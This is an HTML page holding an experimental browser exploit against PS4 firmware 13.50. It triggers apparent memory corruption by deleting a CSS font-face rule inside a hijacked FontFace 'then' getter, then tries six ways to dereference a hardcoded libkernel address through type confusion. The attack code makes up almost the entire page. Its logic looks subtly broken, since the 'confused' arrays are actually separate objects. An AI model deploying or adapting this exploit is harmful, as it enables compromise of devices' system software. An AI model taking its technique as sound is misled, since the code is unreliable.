<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 13.50 - Dereference libkernel</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        font-family: 'Courier New', monospace;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
        color: #00ff41;
        min-height: 100vh;
        padding: 20px;
    }
    
    .container {
        max-width: 1400px;
        margin: 0 auto;
    }
    
    .header {
        text-align: center;
        padding: 30px 0;
        background: rgba(0, 255, 65, 0.05);
        border: 2px solid #00ff41;
        border-radius: 15px;
        margin-bottom: 30px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
        animation: glow 2s ease-in-out infinite alternate;
    }
    
    @keyframes glow {
        from { box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); }
        to { box-shadow: 0 0 40px rgba(0, 255, 65, 0.6); }
    }
    
    .header h1 {
        font-size: 2.5em;
        text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
        margin-bottom: 10px;
        letter-spacing: 3px;
    }
    
    .header .subtitle {
        font-size: 1.2em;
        color: #00cc33;
        letter-spacing: 2px;
    }
    
    .btn {
        display: block;
        margin: 0 auto 30px;
        padding: 20px 50px;
        font-size: 1.5em;
        font-weight: bold;
        border: 3px solid #00ff41;
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 255, 65, 0.2) 100%);
        color: #00ff41;
        cursor: pointer;
        border-radius: 10px;
        transition: all 0.3s ease;
        font-family: 'Courier New', monospace;
        text-transform: uppercase;
        letter-spacing: 2px;
        box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
    }
    
    .btn:hover {
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.2) 0%, rgba(0, 255, 65, 0.4) 100%);
        box-shadow: 0 8px 25px rgba(0, 255, 65, 0.5);
        transform: translateY(-3px);
    }
    
    .log-container {
        background: rgba(0, 0, 0, 0.8);
        border: 2px solid #00ff41;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
    }
    
    .log-header {
        font-size: 1.2em;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 2px solid #00ff41;
        text-transform: uppercase;
        letter-spacing: 2px;
    }
    
    #log {
        font-size: 0.9em;
        line-height: 1.6;
        max-height: 600px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-wrap: break-word;
        padding: 10px;
        background: rgba(0, 0, 0, 0.5);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar {
        width: 10px;
    }
    
    #log::-webkit-scrollbar-track {
        background: rgba(0, 255, 65, 0.1);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar-thumb {
        background: #00ff41;
        border-radius: 5px;
    }
    
    .success { color: #00ff41; font-weight: bold; }
    .error { color: #ff3366; font-weight: bold; }
    .warning { color: #ffaa00; }
    .info { color: #00ccff; }
    .highlight { color: #ff00ff; font-weight: bold; }
</style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>◈ DEREFERENCE ATTEMPT ◈</h1>
        <div class="subtitle">Store libkernel addr → Read as object</div>
    </div>
    
    <button class="btn" onclick="runExploit()">► DEREFERENCE</button>
    
    <div class="log-container">
        <div class="log-header">◈ EXPLOIT LOG ◈</div>
        <div id="log"></div>
    </div>
</div>

<script>
"use strict";

let logBuf = [];

function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.innerHTML = logBuf.map(line => {
            let className = '';
            if (line.includes('[+++]')) className = 'success';
            else if (line.includes('[ERROR]')) className = 'error';
            else if (line.includes('[!]')) className = 'warning';
            else if (line.includes('[+]')) className = 'info';
            else if (line.includes('0x7F8B') || line.includes('0x464C45')) className = 'highlight';
            
            return `<span class="${className}">${line}</span>`;
        }).join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    asDouble() {
        let buf = new ArrayBuffer(8);
        let u32 = new Uint32Array(buf);
        u32[0] = this.low;
        u32[1] = this.high;
        return new Float64Array(buf)[0];
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
}

const LIBKERNEL_BASE = new Int64(0x75C00000, 0x7F8B49F3);

function runExploit() {
    logBuf = [];
    
    log('═══════════════════════════════════════════════════════');
    log('    PS4 13.50 - DEREFERENCE LIBKERNEL ADDRESS           ');
    log('═══════════════════════════════════════════════════════\n');
    
    log('[TARGET] libkernel: ' + LIBKERNEL_BASE.toString());
    log('[STRATEGY] Store as float → Read as object → Dereference\n');
    
    // Setup
    let style = document.createElement('style');
    style.id = 's';
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    let floatArray = new Float64Array(100);
    let objectArray = new Array(100);
    
    for (let i = 0; i < 100; i++) {
        floatArray[i] = 1.1 * (i + 1);
        objectArray[i] = { id: i };
    }
    
    log('[SETUP] Arrays created\n');
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
                
                let corrupted = [];
                for (let i = 0; i < 50; i++) {
                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                        unicodeRange: 'U+' + (0x100 + i).toString(16)
                    }));
                }
                
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                
                log('[CORRUPTION] ✓ Active\n');
                
                // Required setup
                log('[SETUP] Tests 1-3...');
                try {
                    corrupted[0].status;
                    corrupted[1].p = {x:1};
                    floatArray[50] = corrupted[2];
                    log('[SETUP] ✓\n');
                } catch(e) {
                    log('[SETUP] !\n');
                }
                
                // ═══════════════════════════════════════════
                // STORE LIBKERNEL ADDRESS AS FLOAT
                // ═══════════════════════════════════════════
                
                log('[PHASE 2] ▼▼▼ STORE libkernel ADDRESS ▼▼▼\n');
                
                log('[*] Storing libkernel address as float...');
                floatArray[60] = LIBKERNEL_BASE.asDouble();
                
                log('[*] floatArray[60] = ' + LIBKERNEL_BASE.toString());
                log('[*] As double: ' + LIBKERNEL_BASE.asDouble() + '\n');
                
                // ═══════════════════════════════════════════
                // READ AS OBJECT
                // ═══════════════════════════════════════════
                
                log('[PHASE 3] ▼▼▼ READ AS OBJECT ▼▼▼\n');
                
                log('[*] Reading objectArray[60]...');
                let derefObj = objectArray[60];
                
                log('[*] Type: ' + typeof derefObj);
                log('[*] Value: ' + derefObj + '\n');
                
                if (typeof derefObj === 'object' && derefObj !== null) {
                    log('[+] Got object!\n');
                    
                    // ═══════════════════════════════════════════
                    // PROPERTY ACCESS ATTEMPTS
                    // ═══════════════════════════════════════════
                    
                    log('[PHASE 4] ▼▼▼ DEREFERENCING ATTEMPTS ▼▼▼\n');
                    
                    // Try 1: Direct property access
                    log('[TRY 1] Direct property access');
                    try {
                        log('  derefObj.id = ' + derefObj.id);
                        log('  derefObj.marker = ' + hex(derefObj.marker));
                        log('  derefObj[0] = ' + derefObj[0]);
                        log('  derefObj.length = ' + derefObj.length);
                    } catch(e) {
                        log('  [!] Error: ' + e.message);
                    }
                    log('');
                    
                    // Try 2: Enumerate properties
                    log('[TRY 2] Enumerate properties');
                    try {
                        let count = 0;
                        for (let key in derefObj) {
                            log('  ' + key + ': ' + derefObj[key]);
                            count++;
                            if (count > 10) {
                                log('  ...(truncated)');
                                break;
                            }
                        }
                        if (count === 0) log('  (no enumerable properties)');
                    } catch(e) {
                        log('  [!] Error: ' + e.message);
                    }
                    log('');
                    
                    // Try 3: Array-like access
                    log('[TRY 3] Array-like access');
                    try {
                        log('  Trying derefObj[0] through [15]...');
                        for (let i = 0; i < 16; i++) {
                            let val = derefObj[i];
                            if (val !== undefined) {
                                if (typeof val === 'number') {
                                    let addr = Int64.fromDouble(val);
                                    log('  [' + i + '] = ' + addr.toString());
                                } else {
                                    log('  [' + i + '] = ' + val + ' (type: ' + typeof val + ')');
                                }
                            }
                        }
                    } catch(e) {
                        log('  [!] Error at access: ' + e.message);
                    }
                    log('');
                    
                    // Try 4: TypedArray methods
                    log('[TRY 4] TypedArray-style access');
                    try {
                        if (derefObj.buffer) {
                            log('  Has .buffer property!');
                            log('  buffer: ' + derefObj.buffer);
                        }
                        if (derefObj.byteLength) {
                            log('  byteLength: ' + derefObj.byteLength);
                        }
                        if (typeof derefObj.subarray === 'function') {
                            log('  Has .subarray() method!');
                            let sub = derefObj.subarray(0, 4);
                            log('  subarray: ' + sub);
                        }
                    } catch(e) {
                        log('  [!] Error: ' + e.message);
                    }
                    log('');
                    
                    // Try 5: Cast to Uint8Array
                    log('[TRY 5] Force cast to Uint8Array');
                    try {
                        let u8 = new Uint8Array(derefObj);
                        log('  Created Uint8Array from object');
                        log('  Length: ' + u8.length);
                        if (u8.length > 0) {
                            log('  First 16 bytes:');
                            let hex_str = '  ';
                            for (let i = 0; i < Math.min(16, u8.length); i++) {
                                hex_str += u8[i].toString(16).padStart(2, '0') + ' ';
                            }
                            log(hex_str);
                        }
                    } catch(e) {
                        log('  [!] Error: ' + e.message);
                    }
                    log('');
                    
                    // Try 6: toString, valueOf
                    log('[TRY 6] toString/valueOf');
                    try {
                        log('  toString(): ' + derefObj.toString());
                        log('  valueOf(): ' + derefObj.valueOf());
                    } catch(e) {
                        log('  [!] Error: ' + e.message);
                    }
                    log('');
                    
                } else {
                    log('[-] Did not get object back');
                    log('[-] Type was: ' + typeof derefObj + '\n');
                }
                
                // ═══════════════════════════════════════════
                // ANALYSIS
                // ═══════════════════════════════════════════
                
                log('╔════════════════════════════════════════════════╗');
                log('║              ANALYSIS                          ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                log('[WHAT WE LEARNED]');
                log('  If we got an object:');
                log('    Check which TRY succeeded');
                log('    Look for any meaningful data');
                log('    Especially hex values like 0x7F8B or 0x464C45 (ELF header)');
                log('');
                log('  If no object or all TRYs failed:');
                log('    Confusion doesn\'t provide dereference');
                log('    May need WebAssembly or different approach');
                
                log('\n[!] Returning - OOM will occur');
                log('═══════════════════════════════════════════════════════\n');
            }
            
            return undefined;
        }
    });
    
    log('[*] Starting...\n');
    document.fonts.load('1em x', 'AB');
}

log('═══════════════════════════════════════════════════════');
log('       DEREFERENCE ATTEMPT READY                        ');
log('═══════════════════════════════════════════════════════\n');
log('[INFO] Store libkernel address, try to read as object');
log('[INFO] 6 different dereferencing techniques\n');
log('[READY] Click DEREFERENCE\n');

</script>
</body>
</html>
